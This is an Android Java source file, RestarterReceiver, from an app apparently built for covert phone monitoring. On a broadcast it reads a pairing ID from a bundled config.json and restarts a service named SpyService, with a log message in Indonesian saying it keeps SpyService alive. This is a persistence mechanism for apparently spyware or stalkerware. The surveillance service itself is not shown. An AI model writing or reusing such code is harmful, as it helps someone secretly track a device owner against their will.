package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class RestarterReceiver extends BroadcastReceiver {
    private static final String TAG = "RestarterReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String pairId = getPairIdFromConfig(context);
        Log.d(TAG, "Restarter dipicu. Memastikan SpyService tetap aktif untuk Pair ID: " + pairId);
        
        context.startService(new Intent(context, SpyService.class));
    }

    private String getPairIdFromConfig(Context context) {
        try {
            InputStream is = context.getAssets().open("flutter_assets/assets/config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            return new JSONObject(new String(buffer, StandardCharsets.UTF_8)).optString("pairId", "UNKNOWN_ID");
        } catch (Exception e) {
            return "UNKNOWN_ID";
        }
    }
}
